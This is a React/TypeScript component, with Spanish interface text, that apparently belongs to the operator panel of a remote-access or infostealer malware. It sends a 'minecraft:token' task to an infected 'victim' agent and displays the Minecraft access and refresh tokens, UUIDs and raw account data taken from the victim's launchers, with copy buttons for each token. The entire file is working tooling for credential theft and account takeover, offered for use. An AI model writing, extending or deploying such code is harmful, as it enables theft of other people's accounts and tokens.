'use client';
import { Copy, KeyRound, RefreshCw, ShieldAlert } from 'lucide-react';
import { useApi, mutate } from '@/hooks/useApi';
import type { Task, Victim } from '@/lib/types';
import { Badge } from '@/components/ui/badge';
import { Button } from '@/components/ui/button';
import { dateTime } from '@/lib/format';
import { toast } from 'sonner';
import { useState } from 'react';
import { versionAtLeast } from '@/lib/actions';

type Account = {
  username: string;
  uuid: string;
  accessToken: string;
  refreshToken: string;
  expiresAt: string;
  state: string;
  type: string;
  reason?: string;
  raw?: Record<string, unknown>;
};

export function MinecraftCard({ victim }: { victim: Victim }) {
  const [busy, setBusy] = useState(false);
  const { data, refresh } = useApi<{ items: Task[] }>(`/tasks?victim=${victim.id}&name=minecraft:token&limit=2`, { pollMs: 8_000 });
  const task = (data?.items ?? [])[0];
  const result = task?.result as { accounts?: Account[]; errors?: string[]; files?: string[] } | undefined;
  const accounts = result?.accounts ?? [];
  const supported = versionAtLeast(victim.agentVersion, '0.4.1');

  async function scan() {
    setBusy(true);
    try {
      await mutate('/tasks', 'POST', { victim_ids: [victim.id], name: 'minecraft:token', params: {}, timeout_sec: 120 });
      setTimeout(() => { refresh(); setBusy(false); }, 2_000);
    } catch { setBusy(false); }
  }

  function copy(value: string, label: string) {
    if (!value) return;
    void navigator.clipboard.writeText(value);
    toast.success(`${label} copiado`);
  }

  return (
    <section className="xp-card rounded-lg border border-line bg-panel/30 p-2" aria-label="Cuenta de Minecraft">
      <div className="flex items-center gap-2">
        <KeyRound className="h-3.5 w-3.5 text-muted" />
        <p className="text-2xs uppercase tracking-wide text-muted">Cuenta de Minecraft</p>
        {accounts.length > 0 ? <Badge tone="warn"><ShieldAlert className="h-2.5 w-2.5" />token sensible</Badge> : null}
        <Button size="icon" variant="ghost" className="ml-auto" aria-label="Buscar token de Minecraft" loading={busy} disabled={!victim.socket || !supported} onClick={() => void scan()}><RefreshCw className="h-3 w-3" /></Button>
      </div>
      {task?.status === 'error' ? <p className="mt-1 text-2xs text-bad">{task.error}</p> : null}
      {!supported ? <p className="mt-1 text-2xs text-warn">Requiere agente 0.4.1; actualiza el JAR de la víctima.</p> : null}
      {!task ? <p className="mt-1 text-2xs text-muted">Sin lectura. Busca el token en launchers instalados.</p> : null}
      {task && accounts.length === 0 && task.status === 'done' ? <p className="mt-1 text-2xs text-muted">No hay cuentas con token en los launchers leídos: {(result?.files ?? []).join(', ') || 'ninguno'}.</p> : null}
      {accounts.map((account) => (
        <div key={`${account.uuid}-${account.username}`} className="mt-1.5 flex items-start gap-2 border-t border-line/50 pt-1.5" data-minecraft-account>
          {/* eslint-disable-next-line @next/next/no-img-element */}
          <img src={`https://crafatar.com/avatars/${account.uuid}?size=40&overlay`} alt={`skin ${account.username}`} width={40} height={40} className="rounded border border-line bg-bg" />
          <div className="min-w-0 flex-1">
            <p className="font-mono text-xs text-ink">{account.username || '—'} <Badge tone={account.state === 'valido' ? 'ok' : account.state === 'refrescado' ? 'brand' : 'bad'}>{account.state}</Badge> <Badge>{account.type}</Badge></p>
            <p className="truncate font-mono text-2xs text-muted">{account.uuid || 'sin uuid'} · caduca {account.expiresAt ? dateTime(account.expiresAt) : '—'}</p>
            <div className="mt-1 flex flex-wrap gap-1">
              <Button size="sm" variant="secondary" onClick={() => copy(account.accessToken, 'Token')} disabled={!account.accessToken}><Copy className="h-2.5 w-2.5" /> token</Button>
              <Button size="sm" variant="secondary" onClick={() => copy(account.refreshToken, 'Refresh')} disabled={!account.refreshToken}><Copy className="h-2.5 w-2.5" /> refresh</Button>
            </div>
            <details className="mt-1">
              <summary className="cursor-pointer text-2xs text-muted">JSON crudo</summary>
              <pre className="mt-1 max-h-32 overflow-auto whitespace-pre-wrap break-all rounded bg-black/30 p-1 font-mono text-2xs text-muted">{JSON.stringify(account.raw ?? account, null, 2)}</pre>
            </details>
          </div>
        </div>
      ))}
      {result?.errors?.length ? <p className="mt-1 text-2xs text-warn">Avisos: {result.errors.join(' · ')}</p> : null}
    </section>
  );
}
